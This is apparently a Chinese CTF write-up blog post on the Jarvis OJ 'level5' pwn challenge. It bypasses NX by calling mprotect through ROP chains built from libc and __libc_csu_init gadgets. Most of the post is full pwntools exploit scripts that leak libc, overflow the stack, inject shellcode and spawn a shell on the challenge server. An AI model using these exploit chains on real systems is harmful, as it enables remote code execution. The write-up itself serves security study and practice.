---
layout:     post
title:      level5
subtitle:    level5
date:       2018-11-8
author:     XT
header-img: img/post-bg-coffee.jpeg
catalog: 	 true
tags:
    - pwn
    - xman
---


> level5

# level5

## 这是关于mprotect的应用

首先关于**mprotect函数**

```c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot)
```

**mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。** 

![1541645784475](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541645784475.png)

可见打开了nx保护

所以应该是要用mprotect改data段到可执行，然后执行shellcode拿shell。 

程序执行后，vmmap查看data段的地址

![1541645937742](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541645937742.png)

看到地址为***0x600000-0x601000***

我们还是先找到write函数的地址，进而计算libc的偏移地址。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level3_x64"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
elf = context.binary

io = remote("pwn2.jarvisoj.com", 9884)
libc = ELF("./libc-2.19.so")

prdi = 0x00000000004006b3
pprsi = 0x00000000004006b1
leak = flat(cyclic(0x80 + 8), prdi, 1, pprsi, elf.got['write'], 0, elf.plt['write'], elf.sym['_start'])
io.sendafter("Input:\n", leak)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
success("libc -> {:#x}".format(libc.address))
pause()
```
这样就能算出libc的偏移地址

```shell
[+] libc -> 0x7f0895c59000
```

接下来就可以设置data的权限了

而我们如果要执行mprotect就需要把第三个参数写为7，即

**mprotect(0x600000,0x1000,7);**

mprotect的第一个参数标识要写的内存页的首地址。这里是以页为单位访问。一页是４kb也就是0x1000字节所以mprotect的第一个参数必须是0x1000的倍数。第二个参数标识要设置的权限的地址的范围。这个多少都无所谓，不过需要把bss段包含进去。 



我们这个elf文件中并没有pop rbx的gadget

![1541646188733](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541646188733.png)

只能控制rdi，rsi，r15.

所以如果想控制rdx的话就需要一些技巧了

我们这里有两种方法，第一种是通过libc中的gadget

 

1.ROPgadget --binary  libc-2.19.so --only 'pop|ret'|grep 'rdx'

得到了pop rdx|ret的地址，然后用这个gadget来调用第三个参数

同理获取rsi的gadget。

```
0x0000000000001b8e : pop rdx ; ret
```

```
0x0000000000024885 : pop rsi ; ret
```

然后payload

```python
prsi = libc.address + 0x24885
prdx = libc.address + 0x1b8e
mprotect = flat(cyclic(0x80 + 8), prdi, 0x00600000, prsi, 0x1000, prdx, 7, libc.sym['mprotect'], elf.sym['_start'])
print mprotect
io.sendafter("Input:\n", mprotect)
pause()
```

最后我们写到bss段里

```python
read = flat(cyclic(0x80 + 8), prdi, 0, prsi, elf.bss() , prdx, 0x100, elf.plt['read'], elf.bss() )
io.sendafter("Input:\n", read)
io.send(asm(shellcraft.sh()))
io.interactive()
```

博客的大佬写的整个脚本为

```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level3_x64"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
elf = context.binary

if sys.argv[1] == "l":
    io = process("./level3_x64", env = {"LD_PRELOAD": "./libc-2.19.so"})
    #  libc = elf.libc
    libc = ELF("./libc-2.19.so")
else:
    io = remote("pwn2.jarvisoj.com", 9884)
    libc = ELF("./libc-2.19.so")

if __name__ == "__main__":
    '''
    0x00000000004006b3 : pop rdi ; ret
    0x00000000004006b1 : pop rsi ; pop r15 ; ret
    '''
    prdi = 0x00000000004006b3
    pprsi = 0x00000000004006b1
    leak = flat(cyclic(0x80 + 8), prdi, 1, pprsi, elf.got['write'], 0, elf.plt['write'], elf.sym['_start'])
    io.sendafter("Input:\n", leak)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
    success("libc -> {:#x}".format(libc.address))
    pause()

    '''
    0x0000000000024885: pop rsi; ret;
    0x0000000000001b8e: pop rdx; ret; 
    '''
    #  gdb.attach(io, "b *0x400619\nc")
    prsi = libc.address + 0x24885
    prdx = libc.address + 0x1b8e
    mprotect = flat(cyclic(0x80 + 8), prdi, 0x00600000, prsi, 0x1000, prdx, 7, libc.sym['mprotect'], elf.sym['_start'])
    print mprotect
    io.sendafter("Input:\n", mprotect)
    pause()

    read = flat(cyclic(0x80 + 8), prdi, 0, prsi, elf.bss() , prdx, 0x100, elf.plt['read'], elf.bss() )
    io.sendafter("Input:\n", read)
    io.send(asm(shellcraft.sh()))

    io.interactive()

```

自己整理一下简单的可以理解的,大体差不多。

```python
#coding=utf-8
from pwn import *
#conn=process('./pwn')
context.binary = './pwn'
conn=remote("pwn2.jarvisoj.com", "9884")
e=ELF('./pwn')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc-2.19.so')
vul_addr=e.symbols["vulnerable_function"]
write_plt=e.symbols['write']
write_got=e.got['write']
read_plt=e.symbols['read']
pop_rdi=0x4006b3 #pop rdi;ret
pop_rsi=0x4006b1 #pop rsi;pop r15;ret
##############################################
#get mprotect_addr
#edx=0x200 is not serious
payload1='a'*(0x80+0x08)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(8)+p64(write_plt)+p64(vul_addr)
conn.recv()
conn.send(payload1)
pause()
write_addr=u64(conn.recv(8))       #leak write_addr
print write_addr
#libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
libc_write=libc.symbols['write']
libc_mprotect=libc.symbols['mprotect']
mprotect_addr=libc_mprotect-libc_write+write_addr       #offset mprotect
print hex(libc.address)
print hex(-libc_write+write_addr)
prdx=-libc_write+write_addr+0x1b8e
prsi=-libc_write+write_addr+0x24885
#payload2 = flat(cyclic(0x80 + 8), pop_rdi, 0x00600000, prsi, 0x1000, prdx, 7, mprotect_addr, e.sym['_start'])
payload2='a'*(0x80+0x08)+p64(pop_rdi)+p64(0x600000)+p64(prsi)+p64(0x1000)+p64(prdx)+p64(7)+p64(mprotect_addr)+p64(vul_addr)
conn.sendafter("Input:\n", payload2)
pause()
payload3='a'*(0x80+0x08)+p64(pop_rdi)+p64(0)+p64(prsi)+p64(e.bss()+0x500)+p64(prdx)+p64(0x100)+p64(e.plt['read'])+p64(e.bss()+0x500)
conn.sendafter("Input:\n", payload3)
conn.send(asm(shellcraft.sh()))
conn.interactive()
```



2.我们可以利用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以我们可以利用这个函数，先看一下函数 

```shell
.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:0000000000400650                 push    r15
.text:0000000000400652                 mov     r15d, edi
.text:0000000000400655                 push    r14
.text:0000000000400657                 mov     r14, rsi
.text:000000000040065A                 push    r13
.text:000000000040065C                 mov     r13, rdx
.text:000000000040065F                 push    r12
.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400668                 push    rbp
.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:0000000000400670                 push    rbx
.text:0000000000400671                 sub     rbp, r12
.text:0000000000400674                 xor     ebx, ebx
.text:0000000000400676                 sar     rbp, 3
.text:000000000040067A                 sub     rsp, 8
.text:000000000040067E                 call    _init_proc
.text:0000000000400683                 test    rbp, rbp
.text:0000000000400686                 jz      short loc_4006A6
.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400690
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
.text:00000000004006B4 __libc_csu_init endp
```



在loc_4006A6这个函数下面，有6个pop。
在loc_400690函数下面刚好前三个寄存器的赋值语句，以及一个call函数调用，简直完美有没有。
所以我们只需要先调用loc_4006A6
将r13,r14,r15设置为mprotect函数的三个参数值，将r12设置为mprotect的地址，rbx置0，再调用loc_400690的时候，
自然就执行mprotect函数了。（为了跳出这个循环，还需将rbp设置为1） 



```python
#try to call mprotect 
payload5+='a'*8+p64(0)+p64(1)+p64(mprotect_got)+p64(7)+p64(0x1000)+p64(0x600000)
payload5+=p64(csu_end)
#try to call shellcode
payload5+='a'*8+p64(0)+p64(1)+p64(bss_got)+p64(0)+p64(0)+p64(0)
payload5+=p64(csu_end)
```

**不过我们需要把shellcode写入got表**
**mprotect也是要写入got表**
**否则就call [r12]无法执行**

最终的脚本

```python
#coding=utf-8
from pwn import *
context.binary = './level3_x64'
#conn=process('./level3_x64')
conn=remote("pwn2.jarvisoj.com", "9884")
e=ELF('./level3_x64')
#libc=ELF('/usr/lib64/libc-2.26.so')
libc=ELF('./libc-2.19-2.so')
vul_addr=e.symbols["vulnerable_function"]
write_plt=e.symbols['write']
write_got=e.got['write']
read_plt=e.symbols['read']
pop_rdi=0x4006b3 #pop rdi;ret
pop_rsi=0x4006b1 #pop rsi;pop r15;ret
##############################################
#get mprotect_addr
#edx=0x200 is not serious
payload1='a'*(0x80+0x08)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(8)+p64(write_plt)+p64(vul_addr)
conn.recv()
sleep(0.2)
conn.send(payload1)
sleep(0.2)
write_addr=u64(conn.recv(8))       #leak write_addr
pause()
 
libc_write=libc.symbols['write']
libc_mprotect=libc.symbols['mprotect']
mprotect_addr=libc_mprotect-libc_write+write_addr       #offset mprotect
 
#write the shellcode to bss
bss_addr=e.bss()
shellcode=asm(shellcraft.sh())
payload2='a'*(0x80+0x08)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(8)+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload2)
sleep(0.2)
conn.send(shellcode)
 
#write the bss to got_table
pause()
bss_got=0x600a47#any empty got_table address is ok
payload3='a'*(0x80+0x08)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_got)+p64(8)+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload3)
sleep(0.2)
conn.send(p64(bss_addr))
 
#write the mprotect to got_table
pause()
mprotect_got=0x600a51#any empty got_table address is ok
payload4='a'*(0x80+0x08)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(mprotect_got)+p64(8)+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload4)
sleep(0.2)
conn.send(p64(mprotect_addr))
 
pause()
#add rsp,8 
#pop rbx
#pop rbp
#pop r12            mprotect_got
#pop r13            rdx
#pop r14            rsi
#pop r15            rdi
#retn
csu_start=0x4006a6
csu_end=0x400690
payload5='a'*(0x80+0x08)+p64(csu_start)
payload5+='a'*8+p64(0)+p64(1)+p64(mprotect_got)+p64(7)+p64(0x1000)+p64(0x600000)
payload5+=p64(csu_end)
payload5+='a'*8+p64(0)+p64(1)+p64(bss_got)+p64(0)+p64(0)+p64(0)
payload5+=p64(csu_end)
conn.send(payload5)
sleep(0.2)
conn.interactive()
```

> 关于栈溢出的学习先告一段落，先缓缓.....